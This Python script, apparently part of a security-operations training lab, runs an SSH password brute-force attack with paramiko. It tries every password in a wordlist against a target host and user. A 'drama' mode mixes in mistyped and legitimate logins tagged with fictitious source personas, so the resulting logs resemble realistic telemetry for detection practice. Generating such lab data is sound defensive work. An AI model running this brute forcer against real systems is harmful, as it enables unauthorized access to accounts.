#!/usr/bin/env python3
# 04-attacks / Attk101_psuedoattacks.py
# Attk101 - SSH password brute force
# Enhanced drama script: mixes persistent attacker, random fails, and legitimate logins
# from different source IPs to create realistic SOC telemetry.
#
# Usage:
#   python3 Attk101_psuedoattacks.py --target <host> --user <user> --wordlist wordlist.txt
import argparse, datetime, os, sys, time, random

LOGFILE = "attk101_timeline.log"

# Simulated source personas
PERSONAS = [
    {"name": "persistent_attacker", "ip": "198.51.100.22"},
    {"name": "mistyped_helpdesk",   "ip": "10.20.10.15"},
    {"name": "contractor_laptop",   "ip": "10.20.30.44"},
    {"name": "legit_admin",         "ip": "10.20.40.8"},
    {"name": "build_runner",        "ip": "10.20.50.19"},
]

def ts():
    return datetime.datetime.now(datetime.timezone.utc).isoformat()

def log(line):
    msg = f"{ts()} | {line}"
    print(msg, flush=True)
    with open(LOGFILE, "a") as f:
        f.write(msg + "\n")

def try_login(target, port, user, pw, persona):
    """Attempt SSH auth, returns (success, detail)."""
    import paramiko
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            target, port=port,
            username=user, password=pw,
            timeout=5, allow_agent=False, look_for_keys=False,
            banner_timeout=5, auth_timeout=5,
        )
        client.close()
        return (True, persona["name"])
    except paramiko.AuthenticationException:
        return (False, persona["name"])
    except Exception as e:
        return (False, f"{persona['name']} (error: {type(e).__name__})")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True)
    ap.add_argument("--port", type=int, default=22)
    ap.add_argument("--user", required=True)
    ap.add_argument("--wordlist", required=True)
    ap.add_argument("--delay", type=float, default=0.5)
    ap.add_argument("--drama", action="store_true", help="Mix persistent attacker, light mistakes, and normal login attempts")
    ap.add_argument("--normal-every", type=int, default=5, help="In drama mode, attempt a normal login every N attack attempts")
    ap.add_argument("--valid-password-env", default="ATTK101_VALID_PASSWORD", help="Env var containing a lab-only valid password for normal-login noise")
    ap.add_argument("--mistakes", type=int, default=3, help="Total wrong-password background mistakes in drama mode")
    args = ap.parse_args()

    try:
        import paramiko
    except ImportError:
        print("Install paramiko:  pip3 install paramiko", file=sys.stderr)
        sys.exit(1)

    with open(args.wordlist) as f:
        words = [w.strip() for w in f if w.strip() and not w.lstrip().startswith("#")]

    log(f"[Attk101] START | target={args.target}:{args.port} user={args.user} "
        f"attempts={len(words)} drama={args.drama}")

    if args.drama:
        log("[Attk101] NOTE | drama personas are intent labels. Real sshd source IP is the network peer; run from separate hosts/proxies for true multi-source Splunk IPs.")

    hits = 0
    mistakes_left = max(0, args.mistakes)
    normal_password = os.environ.get(args.valid_password_env, "")
    for i, pw in enumerate(words, 1):
        persona = PERSONAS[0]
        log_prefix = f"src={persona['ip']} actor={persona['name']}"

        ok, detail = try_login(args.target, args.port, args.user, pw, persona)
        if ok:
            log(f"[Attk101] SUCCESS attempt={i} {log_prefix} credential_valid=true")
            hits += 1
            break
        else:
            log(f"[Attk101] FAIL attempt={i} {log_prefix}")

        if args.drama and mistakes_left and i in {2, 4, 7, 11, 16, 23}:
            extra_p = PERSONAS[1 + (args.mistakes - mistakes_left) % 2]
            extra_log = f"src={extra_p['ip']} actor={extra_p['name']}"
            ok_noise, _ = try_login(args.target, args.port, args.user, f"mistype_{random.randint(100,999)}", extra_p)
            if ok_noise:
                log(f"[Attk101] DRAMA-NOISE-SUCCESS {extra_log} unexpected=true")
            else:
                log(f"[Attk101] DRAMA-FAIL {extra_log}")
            mistakes_left -= 1
            time.sleep(0.3)

        if args.drama and normal_password and args.normal_every > 0 and i % args.normal_every == 0:
            normal_p = PERSONAS[3 + (i // args.normal_every) % 2]
            normal_log = f"src={normal_p['ip']} actor={normal_p['name']}"
            ok_normal, _ = try_login(args.target, args.port, args.user, normal_password, normal_p)
            log(f"[Attk101] DRAMA-NORMAL {'SUCCESS' if ok_normal else 'FAIL'} attempt={i} {normal_log} credential_valid={str(ok_normal).lower()}")
            time.sleep(0.3)

        time.sleep(args.delay)

    log(f"[Attk101] END | target={args.target} attempts={len(words)} valid={hits} drama={args.drama}")
    print(f"\n[*] Done. Timeline in {LOGFILE}")

if __name__ == "__main__":
    main()
